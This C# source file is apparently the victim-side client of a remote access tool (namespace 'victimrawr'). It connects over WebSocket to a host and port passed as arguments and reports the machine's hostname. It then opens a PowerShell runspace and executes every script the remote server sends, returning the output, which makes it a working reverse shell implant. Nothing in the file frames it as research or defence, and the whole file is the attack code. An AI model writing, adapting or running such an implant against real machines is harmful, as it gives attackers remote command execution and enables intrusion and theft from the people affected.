using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections.ObjectModel;
using System.Text;
using WebSocketSharp;

namespace victimrawr {
    class Program {

        static string GetPSOutput(Collection<PSObject> results, bool isLocation = false) {
            StringBuilder stringBuilder = new StringBuilder();
            foreach(PSObject psobj in results) {
                if (isLocation) {
                    stringBuilder.Append(psobj.ToString());
                }
                else {
                    stringBuilder.AppendLine(psobj.ToString());
                }
            }
            return stringBuilder.ToString();
        }

        static void SendCommand(WebSocket ws, Runspace rn, Pipeline pipe, string script) {
            string toSend = "--SHELL--||||";
            string status = "success";
            pipe = rn.CreatePipeline();
            if(script != "" && script != "clear") {
                try {
                    pipe.Commands.AddScript(script);
                    pipe.Commands.Add("Out-String");
                    toSend += GetPSOutput(pipe.Invoke());
                    pipe = rn.CreatePipeline();
                } catch (Exception ex) {
                    pipe = rn.CreatePipeline();
                    toSend += "\n" + ex.Message + "\n\n";
                    status = "error";
                }
            }
            pipe.Commands.AddScript("$gl69penis=Get-Location; $gl69penis.Path");
            pipe.Commands.Add("Out-String");
            toSend += ("[PS] <" + GetPSOutput(pipe.Invoke(), true).Trim() + "> ||||" + status);
            ws.Send(toSend);
        }

        static void Main(string[] args) {
            using (var ws = new WebSocket("ws://"+args[0]+":"+args[1])) {
                Runspace runspace = null;
                Pipeline pipeline = null;
                ws.OnMessage += (sender, e) => {
                    if (e.Data == "--CONFIRM--") {
                        ws.Send("--CONFIRM--||||Confirmed > " + System.Net.Dns.GetHostName().ToString());
                    }
                    else if (e.Data == "--GET-SHELL--") {
                        runspace = RunspaceFactory.CreateRunspace();
                        runspace.Open();
                        pipeline = runspace.CreatePipeline();
                        pipeline.Commands.AddScript("cd $home");
                        Collection<PSObject> results = pipeline.Invoke();
                        SendCommand(ws, runspace, pipeline, "");
                    }
                    else {
                        string[] splt = e.Data.Split(new[] { "||||" }, StringSplitOptions.None);
                        string msgEvent = splt[0];
                        string command = splt[1];
                        if(msgEvent == "--SHELL--") {
                            SendCommand(ws, runspace, pipeline, command);
                        }
                    }
                };
                ws.OnClose += (s, e) => {
                    Environment.Exit(0);
                };
                ws.Connect();
                Console.ReadKey();
            }
        }
    }
}
